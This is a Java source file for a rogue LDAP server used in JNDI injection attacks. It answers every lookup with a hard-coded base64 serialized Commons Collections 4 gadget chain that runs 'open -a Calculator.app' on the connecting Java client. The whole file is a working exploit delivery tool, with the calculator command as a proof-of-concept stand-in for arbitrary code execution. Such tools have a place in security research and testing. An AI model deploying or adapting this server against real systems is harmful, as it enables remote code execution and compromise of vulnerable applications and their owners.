package jndi;

import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;

/**
 * @author Whoopsunix
 */
public class JNDIServer {
    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main(String[] args) throws Exception {
        int port = 1389;

        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
        config.setListenerConfigs(new InMemoryListenerConfig(
                "listen", //$NON-NLS-1$
                InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                port,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()));

        config.addInMemoryOperationInterceptor(new OperationInterceptor());
        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
        System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
        ds.startListening();
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = "Exec";
            Entry entry = new Entry(base);
            try {
                sendResult(result, base, entry);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws Exception {
            e.addAttribute("javaClassName", "");
            // cc2 open -a Calculator.app
            e.addAttribute("javaSerializedData", Base64.decode("rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci/5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAAdAAObmV3VHJhbnNmb3JtZXJ1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgALTAAFX25hbWVxAH4ACkwAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAAAAAAB1cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAJ1cgACW0Ks8xf4BghU4AIAAHhwAAACJsr+ur4AAAAyACABADtvcmcvYXBhY2hlL3N0cnV0cy9qYXNwZXJyZXBvcnRzL2phc3BlcnJlcG9ydGNvbnN0YW50cy9WaWV3cwcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAAY8aW5pdD4BAAMoKVYBAARDb2RlDAAFAAYKAAQACAEAIGphdmF4L3NjcmlwdC9TY3JpcHRFbmdpbmVNYW5hZ2VyBwAKCgALAAgBAAJqcwgADQEAD2dldEVuZ2luZUJ5TmFtZQEALyhMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L3NjcmlwdC9TY3JpcHRFbmdpbmU7DAAPABAKAAsAEQEAPmphdmEubGFuZy5SdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKCdvcGVuIC1hIENhbGN1bGF0b3IuYXBwJyk7CAATAQAZamF2YXgvc2NyaXB0L1NjcmlwdEVuZ2luZQcAFQEABGV2YWwBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwwAFwAYCwAWABkBABBzZXJpYWxWZXJzaW9uVUlEAQABSgVx5mnuPG1HGAEADUNvbnN0YW50VmFsdWUAIQACAAQAAAABABoAGwAcAAEAHwAAAAIAHQABAAEABQAGAAEABwAAACsAAgAEAAAAHyq3AAm7AAtZtwAMTCsSDrYAEk0SFE4sLbkAGgIAV7EAAAAAAAB1cQB+ABgAAADxyv66vgAAADIAEQEAIm9yZy9hcGFjaGUvY2xpL3R5cGVoYW5kbGVyL0NvbW1vbnMHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAUamF2YS9pby9TZXJpYWxpemFibGUHAAUBAAY8aW5pdD4BAAMoKVYBAARDb2RlDAAHAAgKAAQACgEAEHNlcmlhbFZlcnNpb25VSUQBAAFKBXHmae48bUcYAQANQ29uc3RhbnRWYWx1ZQAhAAIABAABAAYAAQAaAAwADQABABAAAAACAA4AAQABAAcACAABAAkAAAARAAEAAQAAAAUqtwALsQAAAAAAAHB0AAZhbnlTdHJwdwEAeHNyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABeA=="));
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

    }
}
